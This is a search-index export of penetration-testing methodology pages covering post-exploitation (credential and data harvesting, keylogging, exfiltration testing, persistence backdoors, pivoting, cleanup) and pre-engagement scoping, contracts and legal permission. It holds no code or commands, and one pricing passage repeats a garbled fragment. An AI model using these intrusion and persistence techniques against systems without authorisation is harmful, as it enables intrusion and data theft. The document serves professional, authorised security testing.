Authority"},{"location":"pentest_standard/postexploration/#source-code-management-server","text":"Identification of source code management systems via by the service running on the compromised host or the client part of the service provides the opportunity for: *Enumerate projects - The project names can give away sensitive information on company projects. *Verify access to source code files *Modify source code files - If it is allowed in scope then modifying source code proves that an attacker could make changes that would affect the system *Enumerate developers - Developers details can be use for social engineering attacks as well as as inputs for attacking other areas of the system *Enumerate configuration","title":"Source Code Management Server"},{"location":"pentest_standard/postexploration/#dynamic-host-configuration-server","text":"Identification of dynamic host configuration service or use of the service by the compromised host allows for: *Enumeration leases given *Enumeration configuration *Enumeration Options *Modification of configuration *Consumption of all leases The control of the service can be used to show risk of denial of service and for use in man in the middle attacks of hosts and services on the compromised network.","title":"Dynamic Host Configuration Server"},{"location":"pentest_standard/postexploration/#virtualization","text":"Identification virtualization services or client software allow for: *Enumerate Virtual Machines (name, configurations, OS) *Enumerate passwords and digital certificates for administration systems. *Enumerate virtualization software configuration *Configuration of Hosts *Show risk of denial of service with control of VM state *Access to data hosted on VM\u2019s *Interception of traffic of virtual hosts or services hosted on the compromised host","title":"Virtualization"},{"location":"pentest_standard/postexploration/#messaging","text":"Identification of services or client software for messaging provides the opportunity to *Identify Directory Services *Compromise of credentials *Access to confidential information *Identification of hosts on the network *System and business relationships All of this information and actions can be used to show risk and to further penetrate a client\u2019s network and hosts.","title":"Messaging"},{"location":"pentest_standard/postexploration/#monitoring-and-management","text":"Identification of services or client software for the purpose of monitoring and/or management may provide identification of additional servers and services on the target network, in addition the configuration parameters gained may provide access to other targets host and to determine what actions performed by the tester can be detected by the client. Some services to look for: *SNMP (Simple Network Management Protocol) *Syslog Some Management Services and Software to look for to gain credentials, identify host and gain access to other services may be: *SSH Server/Client *Telnet Server/Client *RDP (Remote Desktop Protocol) Client *Terminal Server *Virtual Environment Management Software","title":"Monitoring and Management"},{"location":"pentest_standard/postexploration/#backup-systems","text":"Identification of services or client software for the purpose of backing up data provide a great opportunity to an attacker since these system require access to the data and systems they need to backup providing an attacker: *Enumeration of hosts and systems *Enumeration of services *Credentials to host and/or services *Access to backup data The information gained from the service can be used to show risk to the confidentiality, integrity and access tot he system and their information. Access to the backups can also provide opportunity to introduce miss configuration, vulnerable software or backdoors in to the clients systems.","title":"Backup Systems"},{"location":"pentest_standard/postexploration/#networking-services-radiustacacsetc","text":"Identification of services or use of networking services allows for the: *Enumeration of users *Enumeration of hosts and systems *Compromise of credentials *Show risk of denial of service if alternate methods are not present","title":"Networking Services (RADIUS,TACACS..etc)"},{"location":"pentest_standard/postexploration/#sensitive-data","text":"","title":"Sensitive Data"},{"location":"pentest_standard/postexploration/#key-logging","text":"By monitoring key strokes it is possible to detect sensitive information including passwords and PII - Don\u2019t know what the legality of this is if the user is say chatting on private IM while also using company software, anyone know? If the company says that all data on the network can be monitored then this should be ok. If the second bullet point in Protect Yourself is present and it states that use of equipment can be monitored and no personal use is permitted yes, if policy does not cover personal user or ownership of data, no. It should be extended to cover Network also.","title":"Key-logging"},{"location":"pentest_standard/postexploration/#screen-capture","text":"Screen capture can be use to show evidence of compromise as well as access to information that can shown on the screen and access thru other means is not possible. Great care should be taken with the data collected thru screen capture so as to nor show private data of employees of customers of the client.","title":"Screen capture"},{"location":"pentest_standard/postexploration/#network-traffic-capture","text":"Network traffic capture can be used depending on the controls on the network and medium used for capture can be used to: *Identify hosts on the network *Intercept data *Identify services *Identify relations between hosts in the network *Capture of credentials Care should be taken to only capture traffic covered under the scope of the engagement and that the information captured does not fall under the control of local laws like the capture of Voice Over IP calls. Information retained and shown should be filtered so as to protect client\u2019s customer and/or employee personal and confidential data.","title":"Network traffic capture"},{"location":"pentest_standard/postexploration/#previous-audit-reports","text":"","title":"Previous Audit reports"},{"location":"pentest_standard/postexploration/#user-information","text":"In this section the main focus is on the information present on the target system related to user accounts either present on the system or that have connected remotely and have left some trace that the personnel performing the assessment can gather and analyze for further penetration or provide the desired goal of the assessment.","title":"User Information"},{"location":"pentest_standard/postexploration/#on-system","text":"General information that can be gather on a compromised system are: History files - History files store recent commands the user has executed. Reading through these can reveal system configuration information, important applications, data locations and other system *sensitive information. *Encryption Keys (SSH, PGP/GPG) *Interesting Documents (.doc/x, .xls/x , password. ) - Users often store passwords and other sensitive information in clear text documents. These can be located in two ways, either searching through file names for interesting words, such as password.txt, or searching through the documents themselves. Indexing services can help with this, for example the Linux locate database. *User specific application configuration parameters *Individual Application History (MRU Windows only, history files..etc) *Enumerate removable media *Enumerate network shares / domain permission (gpresult)","title":"On System"},{"location":"pentest_standard/postexploration/#web-browsers","text":"Information that can be gathered from web browsers that can be use to identify other hosts and systems as well as provide information to further penetrate a client\u2019s network and hosts are: *Browser History *Bookmarks *Download History *Credentials *Proxies *Plugins/Extensions Great care should be taken that only data in scope for the engagement is capture since the information from a web browser may contain client\u2019s employee confidential and private data. This data should be filtered from the data returned and report.","title":"Web Browsers"},{"location":"pentest_standard/postexploration/#im-clients","text":"Information that can be gathered from IM Clients on a compromised system is: *Enumerate Account Configuration (User, Password, Server, Proxy) *Chat Logs Great care should be taken that only data in scope for the engagement is capture since the information from a web browser may contain client\u2019s employee confidential and private data. This data should be filtered from the data returned and report.","title":"IM Clients"},{"location":"pentest_standard/postexploration/#system-configuration","text":"","title":"System Configuration"},{"location":"pentest_standard/postexploration/#password-policy","text":"By enumerating the systems password policy the ability to brute force and crack passwords becomes much more efficient, for example knowing that the minimum password length is 8 characters you can remove any word less than 8 characters from a dictionary.","title":"Password Policy"},{"location":"pentest_standard/postexploration/#security-policies","text":"","title":"Security Policies"},{"location":"pentest_standard/postexploration/#configured-wireless-networks-and-keys","text":"By finding the targets wireless information it becomes possible to launch physical attacks through the companies wifi when on site. It can also allow a fake AP to be set up to lure targets to connect when away from site.","title":"Configured Wireless Networks and Keys"},{"location":"pentest_standard/postexploration/#high-valueprofile-targets","text":"High value/profile targets can be identified and further expanded from the targets identified in the pre-engagement meetings thru the analysis of the data gathered from the compromised systems and the interactions of those systems and the services that run on them This view of the the operation and interactions of these high value/profile targets helps in the identification and measurement of of impact that can be gained to the business do to the data and processes and to the overall integrity of the client\u2019s infrastructure and services.","title":"High Value/Profile Targets"},{"location":"pentest_standard/postexploration/#data-exfiltration","text":"","title":"Data Exfiltration"},{"location":"pentest_standard/postexploration/#mapping-of-all-possible-exfiltration-paths","text":"from each of the areas where access has been achieved, a full exfiltration paths should be created. This includes secondary and tertiary means of getting to the outside world (through different accessible subnetc, etc). Once the mapping is provided, the actual exfiltration testing should be commenced.","title":"Mapping of all possible exfiltration paths"},{"location":"pentest_standard/postexploration/#testing-exfiltration-paths","text":"Per exfiltration paths mapping, data should be exfiltrated from the organization being tested. This should already be covered in the [[Pre-engagement]] scoping and adequate infrastructure should have been setup which adheres to the customer's acceptable engagement policy (i.e. data being exfiltrated is usually exfiltrated to a server in the full control of the tester, and will access and ownership right to the tested organization). The exfiltration itself should simulate real-world exfiltration strategies used by the threat actors that correspond to the [[Threat Modeling Standard]] relevant for the organization (i.e. if criminal mostly then \"standard\" exfiltration using a staging area inside the network where data is archived inside zip/7z encrypted files and then sent to FTP/HTTP servers on the Internet, if a more sophisticated threat actor then using means that simulate such strategies and tactics used for exfiltration).","title":"Testing exfiltration paths"},{"location":"pentest_standard/postexploration/#measuring-control-strengths","text":"When performing exfiltration testing, the main goal of the test is to see whether the current controls for detecting and blocking sensitive information from leaving the organization actually work, as well as exercise the response teams if anything has been detected in terms of how they react to such alerts and how are the events being investigated and mitigated.","title":"Measuring control strengths"},{"location":"pentest_standard/postexploration/#persistence","text":"*Installation of backdoor that requires authentication. *Installation and/or modification of services to connect back to system. User and complex password should be used as a minimum; use of certificates or cryptographic keys is preferred where possible. (SSH, ncat, RDP). Reverse connections limited to a single IP may be used. *Creation of alternate accounts with complex passwords. *When possible backdoor must survive reboots.","title":"Persistence"},{"location":"pentest_standard/postexploration/#further-penetration-into-infrastructure","text":"Pivoting is the action in which the tester will use his presence of on the compromised system to further enumerate and gain access to other systems on the client\u2019s infrastructure. This action can be executed from the compromised host it self using local resourced or tools uploaded to the compromised system.","title":"Further Penetration Into Infrastructure"},{"location":"pentest_standard/postexploration/#from-compromised-system","text":"Actions that can be taken from a compromised system: *Upload tools *Use local system tools *ARP Scan *Ping Sweep *DNS Enumeration of internal network *Directory Services Enumeration *Brute force attacks *Enumeration and Management thru Management Protocols and compromised credentials (WinRM, WMI, SMB, SNMP..etc) *Abuse of compromised credentials and keys (Webpages, Databases..etc) *Execute Remote Exploits The action that will be executed will depend on the information needed to show specific risk and/or further penetrating the client's network and hosts. Regular planning sessions are recommended to re-evaluate the information gather and decide the best approach to continue the post exploitation until the set goals are meet.","title":"From Compromised System"},{"location":"pentest_standard/postexploration/#thru-compromised-system","text":"Actions that can be taken thru a compromised system: *Port Forwarding *Proxy to internal network (SSH) *VPN to internal network *Execute Remote Exploit *Abuse of compromised credentials and keys (Webpages, Databases..etc) The action that will be executed will depend on the information needed to show specific risk and/or further penetrating the client's network and hosts. Regular planning sessions are recommended to re-evaluate the information gather and decide the best approach to continue the post exploitation until the set goals are meet.","title":"Thru Compromised System"},{"location":"pentest_standard/postexploration/#cleanup","text":"The cleanup process covers the requirements for cleaning up systems once the penetration test has been completed. This will include all user accounts and binaries used during the test. *Remove all executable, scripts and temporary file from a compromised system. If possible use secure delete method for removing the files and folders. *Return to original values system settings and application configuration parameters if they where modified during the assessment. *Remove all backdoors and/or rootkits installed. *Remove any user accounts created for connecting back to compromise systems.","title":"Cleanup"},{"location":"pentest_standard/preengagemente/","text":"Overview The aim of this section of the PTES is to present and explain the tools and techniques available which aid in a successful pre-engagement step of a penetration test. The information within this section is the result of the many years of combined experience of some of the most successful penetration testers in the world. If you are a customer looking for penetration test we strongly recommend going to the General Questions section of this document. It covers the major questions that should be answered before a test begins. Remember, a penetration test should not be confrontational. It should not be an activity to see if the tester can \"hack\" you. It should be about identifying the business risk associated with and attack. To get maximum value, make sure the questions in this document are covered. Further, as the Scoping activity progresses, a good testing firm will start to ask additional questions tailored to your organization. Introduction to Scope Defining scope is arguably one of the most important components of a penetration test, yet it is also one of the most overlooked. While many volumes have been written about the different tools and techniques which can be utilized to gain access to a network, very little has been written on the topic which precedes the penetration: preparation. Neglecting to properly complete pre-engagement activities has the potential to open the penetration tester (or his firm) to a number of headaches including scope creep, unsatisfied customers, and even legal troubles. The scope of a project specifically defines what is to be tested. How each aspect of the test will be conducted will be covered in the Rules of Engagement section. One key component of scoping an engagement is outlining how the testers should spend their time. As an example, a customer requests that one hundred IP addresses be tested for the price of $100,000. This means that the customer is offering 1,000 per IP address tested. However, this cost structure only remains effective at that volume. A common trap some testers fall into is maintaining linear costs throughout the testing process. If the customer had only asked for one business-critical application to be tested at the same pricing structure ( 1,000 per IP address tested. However, this cost structure only remains effective at that volume. A common trap some testers fall into is maintaining linear costs throughout the testing process. If the customer had only asked for one business-critical application to be tested at the same pricing structure ( 1,000), while the tester will still be only attacking a single IP, the volume of work has increased dramatically. It is important to vary costs based on work done. Otherwise a firm can easily find themselves undercharging for their services, which motivates them to do a less than complete job. Despite having a solid pricing structure, the process is not all black and white. It is not uncommon for a client to be completely unaware of exactly what it is they need tested. It is also possible the client will not know how to communicate effectively what they\u2019re expecting from the test. It is important in the Pre-Engagement phase that the tester is able to serve as a guide through what may be uncharted territory for a customer. The tester must understand the difference between a test which focuses on a single application with severe intensity and a test where the client provides a wide range of IP addresses to test and the goal is to simply find a way in. Metrics for Time Estimation Time estimations are directly tied to the experience of a tester in a certain area. If a tester has significant experience in a certain test, he will likely innately be able to determine how long a test will take. If the tester has less experience in the area, re-reading emails and scan logs from previous similar tests the firm has done is a great way to estimate the time requirement for the current engagement. Once the time to test is determined, it is a prudent practice to add 20% to the time. The extra 20% on the back end of the time value is called padding. Outside of consultant circles, this is also referred to as consultant overhead. The padding is an absolute necessity for any test. It provides a cushion should any interruptions occur in the testing. There are many events which commonly occur and hinder the testing process. For example, a network segment may go down, or a significant vulnerability may be found which requires many meetings with many levels of management to address. Both of these events are time consuming and would significantly impact the original time estimate if the padding was not in place. What happens if the 20% padding ends up not being necessary? Billing the client for time not worked would be extremely unethical, so it is up to the testers to provide additional value that may not normally have been provided if the engagement time limit had been hit. Examples include walking the company security team through the steps taken to exploit the vulnerability, provide an executive summary if it was not part of the original deliverable list, or spend some additional time trying to crack a vulnerability that was elusive during the initial testing. Another component of the metrics of time and testing is that every project needs to have a definitive drop dead date. All good projects have a well-defined beginning and end. You will need to have a signed statement of work specifying the work and the hours required if you\u2019ve reached the specific date the testing is to end, or if any additional testing or work is requested of you after that date. Some testers have a difficult time doing this because they feel they are being too much of a pain when it comes to cost and hours. However, it has been the experience of the author that if you provide exceptional value for the main test the customer will not balk at paying you for additional work. Scoping Meeting In many cases the scoping meeting will occur after the contract has been signed. Situations do occur wherein many of the scope-related topics can be discussed before contract signing, but they are few and far between. For those situations it is recommended that a non-disclosure agreement be signed before any in-depth scoping discussions occur. The goal of the scoping meeting is to discuss what will be tested. Rules of engagement and costs will not be covered in this meeting. Each of these subjects should be handled in meetings where each piece is the focus of that meeting. This is done because discussions can easily become confused and muddled if focus is not explicitly stated. It is important to act as moderator and keep the discussions on-topic, preventing tangents and declaring certain topics more suited for off-line discussion when necessary. Now that a Rough Order of Magnitude (ROM) value has been established for the project it is time to have a meeting with the customer to validate assumptions. First, it needs to be established explicitly what IP ranges are in scope for the engagement. It is not uncommon for a client to be resistant and assume that it is the prerogative of the tester to identify their network and attack it, to make the test as realistic as possible. This would indeed be an ideal circumstance, however, possible legal ramifications must be considered above all else. Because of this, it is the responsibility of the tester to convey to a client these concerns and to impart upon them the importance of implicit scoping. For example, in the meeting, it should be verified that the customer owns all of the target environments including: the DNS server, the email server, the actual hardware their web servers run on and their firewall/IDS/IPS solution. There are a number of companies which will outsource the management of these devices to third parties. Additionally, the countries, provinces, and states in which the target environments operate in must be identified. Laws vary from region to region and the testing may very well be impacted by these laws. For instance, countries belonging to the European Union are well known to have very stringent laws surrounding the privacy of individuals, which can significantly change the manner in which a social engineering engagement would be executed. Additional Support Based on Hourly Rate Anything that is not explicitly covered within the scope of the engagement should be handled very carefully. The first reason for this is scope creep. As the scope expands, file_suport are consumed, cutting into the profits for the tester and may even create confusion and anger on the part of the customer. There is another issue that many testers do not think of when taking on additional work on an ad-hoc basis: legal ramifications. Many ad-hoc requests are not properly documented so it can be difficult to determine who said what in the event of a dispute or legal action. Further, the contract is a legal document specifying the work that is to be done. It should be tightly tied to the permission to test memo. Any requests outside of the original scope should be documented in the form of a statement of work that clearly identifies the work to be done. We also recommend that it be clearly stated in the contract that additional work will be done for a flat fee per hour and explicitly state that additional work can not be completed until a signed and counter-signed SOW is in place. Questionnaires During initial communications with the customer there are several questions which the client will have to answer in order for the engagement scope can be properly estimated. These questions are designed to provide a better understanding of what the client is looking to gain out of the penetration test, why the client is looking to have a penetration test performed against their environment, and whether or not they want certain types of tests performed during the penetration test. The following are sample questions which may be asked during this phase. General Questions Network Penetration Test Why is the customer having the penetration test performed against their environment? Is the penetration test required for a specific compliance requirement? When does the customer want the active portions (scanning, enumeration, exploitation, etc...) of the penetration test conducted? During business hours? After business hours? On the weekends? How many total IP addresses are being tested? How many internal IP addresses, if applicable? How many external IP addresses, if applicable? Are there any devices in place that may impact the results of a penetration test such as a firewall, intrusion detection/prevention system, web application firewall, or load balancer? In the case that a system is penetrated, how should the testing team proceed? Perform a local vulnerability assessment on the compromised machine? Attempt to gain the highest privileges (root on Unix machines, SYSTEM or Administrator on Windows machines) on the compromised machine? Perform no, minimal, dictionary, or exhaustive password attacks against local password hashes obtained (for example, /etc/shadow on Unix machines)? Web Application Penetration Test How many web applications are being assessed? How many login systems are being assessed? How many static pages are being assessed? (approximate) How many dynamic pages are being assessed? (approximate) Will the source code be made readily available? Will there be any kind of documentation? If yes, what kind of documentation? Will static analysis be performed on this application? Does the client want fuzzing performed against this application? Does the client want role-based testing performed against this application? Does the client want credentialed scans of web applications performed? Wireless Network Penetration Test How many wireless networks are in place? Is a guest wireless network used? If so: Does the guest network require authentication? What type of encryption is used on the wireless networks? What is the square footage of coverage? Will enumeration of rogue devices be necessary? Will the team be assessing wireless attacks against clients? Approximately how many clients will be using the wireless network? Physical Penetration Test How many locations are being assessed? Is this physical location a shared facility? If so: How many floors are in scope? Which floors are in scope? Are there any security guards that will need to be bypassed? If so: Are the security guards employed through a 3 rd party? Are they armed? Are they allowed to use force? How many entrances are there into the building? Is the use of lock picks or bump keys allowed? (also consider local laws) Is the purpose of this test to verify compliance with existing policies and procedures or for performing an audit? What is the square footage of the area in scope? Are all physical security measures documented? Are video cameras being used? Are the cameras client-owned? If so: Should the team attempt to gain access to where the video camera data is stored? Is there an armed alarm system being used? If so: Is the alarm a silent alarm? Is the alarm triggered by motion? Is the alarm triggered by opening of doors and windows? Social Engineering Does the client have a list of email addresses they would like a Social Engineering attack to be performed against? Does the client have a list of phone numbers they would like a Social Engineering attack to be performed against? Is Social Engineering for the purpose of gaining unauthorized physical access approved? If so: How many people will be targeted? It should be noted that as part of different levels of testing, the questions for Business Unit Managers, Systems Administrators, and Help Desk Personnel may not be required. However, in the case these questions are necessary, some sample questions can be found below. Questions for Business Unit Managers Is the manager aware that a test is about to be performed? What is the main datum that would create the greatest risk to the organization if exposed, corrupted, or deleted? Are testing and validation procedures to verify that business applications are functioning properly in place? Will the testers have access to the Quality Assurance testing procedures from when the application was first developed? Are Disaster Recovery Procedures in place for the application data? Questions for Systems Administrators Are there any systems which could be characterized as fragile? (systems with tendencies to crash, older operating systems, or which are unpatched) Are there systems on the network which the client does not own, that may require additional approval to test? Are Change Management procedures in place? What is the mean time to repair systems outages? Is any system monitoring software in place? What are the most critical servers and applications? Are backups tested on a regular basis? When was the last time the backups were restored? Scope Creep Scope creep is one of the most efficient ways to put a penetration testing firm out of business. The issue is that many companies and managers have little to no idea how to identify it, or how to react to it when it happens. There are a couple of things to remember when battling scope creep. First, if a customer is pleased with the work done on a particular engagement, it is very common for them to request additional work. Take this as a compliment, and do not hesitate to ask for additional funding to compensate for the extra time spent. If a customer refuses to pay for the extra work, it is almost never worth staying on to do that work. The second point is even more critical. When dealing with existing customers, take care to keep the prices lower. Taking advantage of a good situation by price gouging is a sure way to drive away repeat business. Take into consideration that prices can be lowered since the firm avoided the costs of acquiring the customer such as the formal RFP process and hunting for the customer itself. Further, the best source for future work is through existing customers. Treat them well and they will return. Specify Start and End Dates Another key component defeating scope creep is explicitly stating start and end dates. This allows the project to have definite end. One of the most common areas in which scope creep occurs is during retesting. Retesting always sounds like a good idea when going after a contract. It shows that the firm is caring and diligent, trying to make ensure that the customer is secure as possible. The problem begins when it is forgotten that the work is not paid for until it is completed. This includes retesting. To mitigate this risk, add a simple statement to the contract which mentions that all retesting must be done within a certain timeframe after the final report delivery. It then becomes the responsibility of the testers to spearhead the retesting effort. If the customer requests an extension, always allow this with the condition that payment be fulfilled at the originally specified date. Finally, and most importantly, perform a quality retest. Remember, the best source for future work is your existing customer base. Specify IP Ranges and Domains Before starting a penetration test, all targets must be identified. These targets should be obtained from the customer during the initial questionnaire phase. Targets can be given in the form of specific IP addresses, network ranges, or domain names by the customer. In some instances, the only target the customer provides is the name of the organization and expects the testers be able to identify the rest on their own. It is important to define if systems like firewalls and IDS/IPS or networking equipment that are between the tester and the final target are also part of the scope. Additional elements such as upstream providers, and other 3 rd party providers should be identified and defined whether they are in scope or not. Validate Ranges It is imperative that before you start to attack the targets you validate that they are in fact owned by the customer you are performing the test against. Think of the legal consequences you may run into if you start attacking a machine and successfully penetrate it only to find out later down the line that the machine actually belongs to another organization (such as a hospital or government agency). Dealing with Third Parties There are a number of situations where an engagement will include testing a service or an application that is being hosted by a third party. This has become more prevalent in recent years as \u201ccloud\u201d services have become more popular. The most important thing to remember is that while permission may have been granted by the client, they do not speak for their third party providers. Thus, permission must be obtained from them as well in order to test the hosted systems. Failing to obtain the proper permissions brings with it, as always, the possibility of violating the law, which can cause endless headaches. Cloud Services The single biggest issue with testing cloud service is there is data from multiple different organizations stored on one physical medium. Often the security between these different data domains is very lax. The cloud services provider needs to be alerted to the testing and needs to acknowledge that the test is occurring and grant the testing organization permission to test. Further, there needs to be a direct security contact within the cloud service provider that can be contacted in the event that a security vulnerability is discovered which may impact the other cloud customers. Some cloud providers have specific procedures for penetration testers to follow, and may require request forms, scheduling or explicit permission from them before testing can begin. ISP Verify the ISP terms of service with the customer. In many commercial situations the ISP will have specific provisions for testing. Review these terms carefully before launching an attack. There are situations where ISPs will shun and block certain traffic which is considered malicious. The customer may approve this risk, but it must always be clearly communicated before beginning. Web Hosting As with all other third parties, the scope and timing of the test needs to be clearly communicated with the web hosting provider. Also, when communicating with the client, be sure to clearly articulate the test will only be in search of web vulnerabilities. The test will not uncover vulnerabilities in the underlying infrastructure which may still provide an avenue to compromise the application. MSSPs Managed Security Service Providers also may need to be notified of testing. Specifically, they will need to be notified when the systems and services that they own are to be tested. However, there are circumstances under which the MSSP would not be notified. If determining the actual response time of the MSSP is part of the test, it is certainly not in the best interest of the integrity of the test for the MSSP to be notified. As a general rule of thumb, any time a device or service explicitly owned by the MSSP is being tested they will need to be notified. Countries Where Servers are Hosted It is also in the best interests of the tester to verify the countries where servers are being housed. After you have validated the country, review the laws of the specific country before beginning testing. It should not be assumed that the firm\u2019s legal team will provide a complete synopsis of local laws for the testers. It should also not be assumed that the firm will take legal responsibility for any laws violated by its testers. It is the responsibility of each tester to verify the laws for each region they are testing in before they begin testing because it will be the tester who ultimately will have to answer for any transgressions. Define Acceptable Social Engineering Pretexts Many organizations will want their security posture tested in a way which is aligned with current attacks. Social engineering and spear-phishing attacks are currently widely used by many attackers today. While most of the successful attacks use pretexts like sex, drugs, and rock and roll (porn, Viagra, and free iPods respectively) some of these pretexts may not be acceptable in a corporate environment. Be sure that any pretexts chosen for the test are approved in writing before testing is to begin. DoS Testing Stress testing or Denial of Service testing should be discussed before the engagement begins. It can be a topic that many organizations are uncomfortable with due to the potentially damaging nature of the testing. If an organization is only worried about the confidentiality or integrity of their data, stress testing may not be necessary; however, if the organization is also worried about the availability of their services, then the stress testing should be conducted in a non-production environment which is identical to the production environment. Payment Terms Another aspect of preparing for a test that many testers completely forget about is how they should be paid. Just like contract dates there should be specific dates and terms for payments. It is not uncommon for larger organizations to delay payment for as long as possible. Below are a few common payment methods. These are simply examples. It is definitely recommended that each organization create and tweak their own pricing structure to more aptly suit the needs of their clients and themselves. The important thing is that some sort of structure be in place before testing begins. Net 30 The total amount is due within 30 days of the delivery of the final report. This is usually associated with a per month percentage penalty for non-payment. This can be any number of days you wish to grant your customers (i.e. 45, or 60). Half Upfront It is not uncommon to require half of the total bill upfront before testing begins. This is very common for longer-term engagements. Recurring A recurring payment schedule is more commonly used for long-term engagements. For example, some engagements may span as far as a year or two. It is not at all uncommon to have the customer pay in regular installments throughout the year. Goals Every penetration test should be goal-oriented. This is to say that the purpose of the test is to identify specific vulnerabilities that lead to a compromise of the business or mission objectives of the customer. It is not about finding un-patched systems. It is about identifying risk that will adversely impact the organization. Primary The primary goal of a test should not be driven by compliance. There are a number of different justifications for this reasoning. First, compliance does not equal security. While it should be understood that many organizations undergo testing because of compliance it should not be the main goal of the test. For example, a firm may be hired to complete a penetration test as part of PCI-DSS requirements. There is no shortage of companies which process credit card information. However, the traits which make the target organization unique and viable in a competitive market will have the greatest impact if compromised. Credit card systems being compromised would certainly be a serious issue, but credit cards numbers, along with all of the associated customer data being leaked would be catastrophic. Secondary The secondary goals are directly related to compliance. It is not uncommon for primary and secondary goals to be very closely related. For example, in the example of the PCI-DSS driven test, getting the credit cards is the secondary goal. Tying that breach of data to the business or mission drivers of the organization is the primary goal. Secondary goals mean something for compliance and/or IT. Primary goals get the attention of upper management. Business Analysis Before performing a penetration test it is beneficial to determine the maturity level of the client\u2019s security posture. There are a number of organizations which choose to jump directly into a penetration test first assessing this maturity level. For customers with a very immature security program, it is often a good idea to perform a vulnerability analysis first. Some testers believe there is a stigma surrounding Vulnerability Analysis (VA) work. Those testers have forgotten that the goal is to identify risks in the target organization, not about pursuing the so-called \u201crockstar\u201d lifestyle. If a company is not ready for a full penetration test, they will get far more value out of a good VA than a penetration test. Establish with the customer in advance what information about the systems they will be providing. It may also be helpful to ask for information about vulnerabilities which are already documented. This will save the testers time and save the client money by not overlapping testing discoveries with known issues. Likewise, a full or partial white-box test may bring the customer more value than a black-box test, if it isn't absolutely required by compliance. Establish Lines of Communication One of the most important aspects of any penetration test is communication with the customer. How often you interact with the customer, and the manner in which you approach them, can make a huge difference in their feeling of satisfaction. Below is a communication framework that will aid in making the customer feel comfortable about the test activities. Emergency Contact Information Obviously, being able to get in touch with the customer or target organization in an emergency is vital. Emergencies may arise, and a point of contact must have been established in order to handle them. Create an emergency contact list. This list should include contact information for all parties in the scope of testing. Once created, the emergency contact list should be shared with all those on the list. Keep in mind, the target organization may not be the customer. Gather the following information about each emergency contact: Full name Title and operational responsibility Authorization to discuss details of the testing activities, if not already specified Two forms of 24/7 immediate contact, such as cell phone, pager, or home phone, if possible One form of secure bulk data transfer, such as SFTP or encrypted email Note: The number for a group such as the help desk or operations center can replace one emergency contact, but only if it is staffed 24/7. The nature of each penetration test influences who should be on the emergency contact list. Not only will contact information for the customer and targets need to be made available, but they may also need to contact the testers in an emergency. The list should preferably include the following people: All penetration testers in the test group for the engagement The manager of the test group Two technical contacts at each target organization Two technical contacts at the customer One upper management or business contact at the customer It is possible that there will be some overlap in the above list. For instance, the target organization may be the customer, the test group\u2019s manager may also be performing the penetration test, or a customer\u2019s technical contact may be in upper management. It is also recommended to define a single contact person per involved party who leads it and takes responsibility on behalf of it. Incident Reporting Process Discussing the organization\u2019s current incident response capabilities is important to do before an engagement for several reasons. Part of a penetration test is not only testing the security an organization has in place, but also their incident response capabilities. If an entire engagement can be completed without the target\u2019s internal security teams ever noticing, a major gap in security posture has been identified. It is also important to ensure that before testing begins, someone at the target organization is aware of when the tests are being conducted so the incident response team does not start to call every member of upper management in the middle of the night because they thought they were under attack or compromised. Incident Definition The National Institute of Standards and Technology (NIST) defines an incident as follows: \u201ca violation or imminent threat of violation of computer security policies, acceptable use policies, or standard security practices.\u201d (Computer Security Incident Handling Guide - Special Publication 800-61 Rev 1). An incident can also occur on a physical level, wherein a person gain unauthorized physical access to an area by any means. The target organization should have different categories and levels for different types of incidents. Status Report Frequency The frequency of status reporting can vary widely. Some factors which influence the reporting schedule include the overall length of the test, the test scope, and the target\u2019s security maturity. An effective schedule allows the customer to feel engaged. An ignored customer is a former customer. Once frequency and schedule of status reports has been set, it must be fulfilled. Postponing or delaying a status report may be necessary, but it should not become chronic. The client may be asked to agree to a new schedule if necessary. Skipping a status report altogether is unprofessional and should be avoided if at all possible. PGP and Other Alternatives Encryption is not optional. Communication with the customer is an absolutely necessary part of any penetration testing engagement and due to the sensitive nature of the engagement, communications of sensitive information must be encrypted, especially the final report. Before the testing begins, a means of secure communication must be established with the client. Several common means of encryption are as follows: PGP/GPG can be used to both communicate over e-mail and to encrypt the final report (remember that subject lines are passed through in plaintext) A secure mailbox hosted on the customer\u2019s network Telephone Face to face meetings To deliver the final report, you can also store the report in an AES encrypted archive file, but make sure that your archive utility supports AES encryption using CBC. Also ask what kinds of information can be put in writing and which should be communicated only verbally. Some organizations have very good reasons for limiting what security information is transmitted to them in writing. Rules of Engagement While the scope defines what will be tested, the rules of engagement defines how that testing is to occur. These are two different aspects which need to be handled independently from each other. Timeline A clear timeline should be established for the engagement. While scope defines the start and the end of an engagement, the rules of engagement define everything in between. It should be understood that the timeline will change as the test progresses. However, having a rigid timeline is not the goal of creating one. Rather, having a timeline in place at the beginning of a test will allow everyone involved to more clearly identify the work that is to be done and the people who will be responsible for said work. GANTT Charts and Work Breakdown Structures are often used to define the work and the amount of time that each specific piece of the work will take. Seeing the schedule broken down in this manner aids those involved in identifying where file_suport need to be applied and it helps the customer identify possible roadblocks which many be encountered during testing. There are a number of free GANTT Chart tools available on the Internet. Many mangers identify closely with these tools. Because of this, they are an excellent medium for communicating with the upper management of a target organization. Locations Another parameter of any given engagement which is important to establish with the customer ahead of time is any destinations to which the testers will need to travel during the test. This could be as simple as identifying local hotels, or complex as identifying the applicable laws of a specific target country. It is not uncommon for an organization to operate in multiple locations and regions and a few select sites will need to be chosen for testing. In these situations, travel to every customer location should be avoided, instead, it should be determined if VPN connections to the sites are available for remote testing. Disclosure of Sensitive Information While one of the goals of a given engagement may be to gain access to sensitive information, certain information should not actually be viewed or downloaded. This seems odd to newer testers, however, there are a number of situations where the testers should not have the target data in their possession. For example Personal Health Information (PHI), under the Health Insurance Portability and Accountability Act (HIPAA), this data must be protected. In some situations, the target system may not have a firewall or anti-virus (AV) protecting it. In this sort of situation, the testers being in possession of any and all Personally Identifiable Information (PII) should be absolutely avoided. However, if the data cannot be physically or virtually obtained, how can it be proved that the testers indeed obtained access to the information? This problem has been solved in a number of ways. There are ways to prove that the vault door was opened without taking any of the money. For instance, a screenshot of database schema and file permissions can be taken, or the files themselves can be displayed without opening them to displaying the content, as long as no PII is visible in the filenames themselves. How cautious the testers should be on a given engagement is a parameter which needs to be discussed with the client, but the firm doing the testing should always be sure to protect themselves in a legal sense regardless of client opinion. Regardless of supposed exposure to sensitive data, all report templates and tester machines should be sufficiently scrubbed following each engagement. As a special side note, if illegal data (i.e. child pornography) is discovered by the testers, proper law enforcement officials should be notified immediately, followed by the customer. Do not take direction from the customer. Evidence Handling When handling evidence of a test and the differing stages of the report it is incredibly important to take extreme care with the data. Always use encryption and sanitize your test machine between tests. Never hand out USB sticks with test reports out at security conferences. And whatever you do, don't re-use a report from another customer engagement as a template! It's very unprofessional to leave references to another organization in your document. Regular Status Meetings 